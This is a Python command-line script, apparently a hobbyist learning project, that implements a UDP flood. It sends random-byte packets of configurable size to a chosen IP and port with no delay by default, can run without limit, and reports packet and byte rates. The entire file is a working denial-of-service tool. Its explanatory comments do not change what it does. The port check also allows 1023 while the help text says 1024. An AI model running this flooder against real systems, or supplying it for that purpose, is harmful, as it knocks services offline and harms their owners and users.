
import socket
import os
import sys
import argparse
import time

def build_packet(size:int=1024)->bytes:
    return os.urandom(size) 
    #random is seeded and not cryptographically secure, i don't need it to be BUT might as well just use this one then, it asks for the OS for a cryptographically random byte from a pool fed various noise it's very cool

def send_packets(target_ip:str,target_port:int,count:int,packet_size:int,delay:float,verbose:bool)->None:
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM ) #Address Family Internet IPv4 , Datagram socket aka UDP, we're using UDP cause it doesn't require handshake
    sent=0
    dropped=0
    start=time.time() #to record how much time passed since we started sending packets to later calculate KB/s or packets/s

    print(f"[TARGET]:{target_ip}:{target_port}")
    print(f"[PACKETS]:{'Unlimited' if count == 0 else count}") #if count is 0 then we send "forever" else i show the actual count of packets sent
    print(f"[SIZE]:{packet_size} packets")
    print(f"[DELAY]:{delay}s between packets") #how many seconds between each packet being sent
    
    try:
        while True:
            if count != 0 and sent >= count: #if we're not sending "unlimited" packets and if the number sent reached the number in argument
                break
            payload=build_packet(packet_size) #building the packet randomly each time calling the funct
            try:
                sock.sendto(payload,(target_ip,target_port)) #sending data to address 
                sent+=1 #post increment of sent packets counter
                if verbose:
                    elapsed=time.time()-start
                    print(f"[Sent Packet]#{sent:>6} | [Packet Size] {packet_size} | [Elapsed Time] {elapsed:.2f}s") #:>6 formatting it so it goes up to 6 numerical characters and .2f just means the decimals for seconds is fixed at 2 decimals
                elif sent % 100 == 0: #if sent is divisible by 100 without remainder i can easily calculate the rate every 100 packets
                    elapsed=time.time()-start
                    rate=sent/elapsed if elapsed > 0 else 0 #i avoid issues if it gets divided by 0, impossible to send 100 packets in 0 seconds cause i don't have secret NSA alien technology
                    print(f"[Packets Sent] {sent} | [Packet Rate] {rate:.1f} pkt/s | [Bytes Rate] {rate*packet_size/1024:.1f} KB/s") #show how many packets, how many packets per second, how many KB per second
            except OSError as e: #error in response to the sendto
                dropped+=1 #post increment dropped packets counter
                if verbose:
                    print(f"[ERROR] packet #{sent+dropped}: {e}") #show the error cause it can give insight on the target (how the port replied)
            if delay>0:
                time.sleep(delay) #apply the delay
    except KeyboardInterrupt:
        print("\n [INTERRUPTED]")
    finally:
        sock.close() #finally close the socket and give it back to OS
        elapsed=time.time()-start
        rate=sent/elapsed if elapsed>0 else 0 #identical to before
        print(f"\n{"="*50}\n[Packets Sent] {sent} | [Dropped packets] {dropped} | [Total Sent] {sent*packet_size/1024:.2f} KB | [Time] {elapsed:.2f} | [Rate] {rate:.1f} pkt/s & {rate*packet_size/1024:.1f} KB/s\n{"="*50}")

def parse_args()->argparse.Namespace:
    parser=argparse.ArgumentParser(
        prog="UDPflood.py",
        description="Send random 1KB UDP packets to target.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument(
        "-t","--target",
        required=True,
        metavar="IP",
        help="Destination IPv4"
    )
    parser.add_argument(
        "-p","--port",
        type=int,
        default=5005, #i set the default UDP as 5005
        metavar="PORT",
        help="Destination UDP port (Default [5005], must be between 1024 and 65535)"
    )
    parser.add_argument(
        "-n","--count",
        type=int,
        default=100,
        metavar="N",
        help="Number of packets to send (Default 100)"
    )
    parser.add_argument(
        "-s","--size",
        type=int,
        default=1024,
        metavar="BYTES",
        help="Packet payload size in bytes (Default 1024 / 1KB)"
    )
    parser.add_argument(
        "-d","--delay",
        type=float,
        default=0.0,
        metavar="SEC",
        help="Delay for every packet (in seconds)"
    )
    parser.add_argument(
        "-v","--verbose",
        action="store_true",
        help="Print info for every packet"
    )

    args=parser.parse_args()

    if not (1023<=args.port<=65535): #port must be within range
        parser.error("Port must be between 1024 and 65535")
    if args.count<0:
        parser.error("Count can't be negative") #can't be negative
    if args.size<1 or args.size>65507:
        parser.error("Packet size must be between 1 and 65507 bytes") # 65535 (max) - 20 (IP header) - 8 (UDP header)
    if args.delay<0:
        parser.error("Delay can't be negative") 
    return args

if __name__ == "__main__":
    args=parse_args()
    send_packets(target_ip=args.target,target_port=args.port,count=args.count,packet_size=args.size,delay=args.delay,verbose=args.verbose)
